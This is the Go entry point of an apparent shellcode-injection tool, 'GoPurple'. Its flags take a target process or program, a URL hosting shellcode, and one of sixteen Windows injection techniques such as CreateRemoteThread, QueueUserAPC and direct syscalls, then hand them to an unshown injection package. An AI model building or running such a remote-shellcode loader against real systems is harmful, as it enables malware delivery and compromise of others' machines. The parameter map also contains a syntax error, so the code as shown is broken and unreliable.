package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/sh4hin/GoPurple/factory"
)

func main() {

	banner :=
		`

=============================================================================
   _____                              _
  / ____|                            | |
 | |  __  ___  _ __  _   _ _ __ _ __ | | ___
 | | |_ |/ _ \| '_ \| | | | '__| '_ \| |/ _ \
 | |__| | (_) | |_) | |_| | |  | |_) | |  __/
  \_____|\___/| .__/ \__,_|_|  | .__/|_|\___|
              | |              | |
              |_|              |_|   by @s3cdev

         `
	fmt.Println(banner)

	pidParam := flag.Int("p", 0, "Process ID to inject shellcode into")
	techParam := flag.String("t", "", "shellcode injection technique to use: \n 1: CreateFiber \n 2: syscall \n 3: CreateThreadNative \n 4: CreateProcess \n 5: EtwpCreateEtwThread \n 6: CreateRemoteThread \n 7: RtlCreateUserThread \n 8: CreateThread \n 9: CreateRemoteThreadNative \n 10: CreateProcessWithPipe \n 11: QueueUserAPC \n 12: CreateThreadpoolWait \n 13: BananaPhone \n 14: EnumerateLoadedModules \n 15: EnumChildWindows \n 16: EnumPageFilesW")
	urlParam := flag.String("u", "", "URL hosting the shellcode")
	progParam := flag.String("prog", "", "program to inject into")
	argsParam := flag.String("a", "", "Program command line arguments")
	blockParam := flag.String("b", "", "block DLL mode (nonms/onlystore for QueueUserAPC )")

	flag.Parse()

	flag.Usage = func() {
		fmt.Printf("Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
	}

	var requiredParamsMap = map[string]int{"1": 2, "2": 2, "3": 2, "4": 4, "5": 2, "6": 3, "7": 3, "8": 2, "9": 3, "10": 4, "11": 5, "12": 2, "13": 2, "14": 2, "15": 2, "16", 2}

	if *techParam == "" || flag.NFlag() != requiredParamsMap[*techParam] {
		flag.PrintDefaults()
		os.Exit(1)
	}

	factory.Run(*techParam, *urlParam, *pidParam, *progParam, *argsParam, *blockParam)
}
